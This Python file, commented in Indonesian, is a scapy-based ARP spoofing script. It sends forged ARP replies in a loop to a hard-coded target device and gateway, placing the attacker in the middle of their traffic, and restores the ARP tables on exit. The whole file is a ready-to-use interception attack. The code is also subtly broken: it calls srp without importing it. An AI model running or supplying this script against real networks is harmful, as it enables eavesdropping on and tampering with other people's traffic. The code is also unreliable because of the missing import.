from scapy.all import ARP, Ether, send, sniff
import time
import sys

def get_mac(ip):
    """Mendapatkan MAC Address berdasarkan IP"""
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, host_ip):
    """Men-spoof ARP, mengalihkan target untuk menghubungi kita"""
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    
    # Membuat paket ARP untuk memalsukan perangkat
    arp_response_target = ARP(op=2, psrc=host_ip, pdst=target_ip, hwdst=target_mac)
    arp_response_host = ARP(op=2, psrc=target_ip, pdst=host_ip, hwdst=host_mac)
    
    send(arp_response_target, verbose=False)
    send(arp_response_host, verbose=False)

def restore_network(target_ip, host_ip):
    """Mengembalikan ARP ke keadaan semula setelah spoofing"""
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    
    # Mengirimkan ARP untuk mengembalikan tabel ARP yang benar
    arp_restore_target = ARP(op=2, psrc=host_ip, pdst=target_ip, hwdst=target_mac, hwsrc=host_mac)
    arp_restore_host = ARP(op=2, psrc=target_ip, pdst=host_ip, hwdst=host_mac, hwsrc=target_mac)
    
    send(arp_restore_target, count=4, verbose=False)
    send(arp_restore_host, count=4, verbose=False)

def start_spoofing(target_ip, host_ip):
    """Menjalankan spoofing tanpa henti"""
    try:
        print("[*] Memulai ARP Spoofing...")
        while True:
            spoof(target_ip, host_ip)
            time.sleep(2)  # Delay untuk menghindari overload
    except KeyboardInterrupt:
        print("\n[!] Program dihentikan oleh pengguna.")
        restore_network(target_ip, host_ip)  # Kembalikan jaringan setelah dihentikan
        sys.exit(0)

if __name__ == "__main__":
    # Tentukan IP perangkat target dan router (host)
    target_ip = "192.168.1.5"  # IP perangkat target yang ingin kamu spoof
    host_ip = "192.168.1.1"    # IP router atau gateway yang ingin kamu spoof
    
    start_spoofing(target_ip, host_ip)
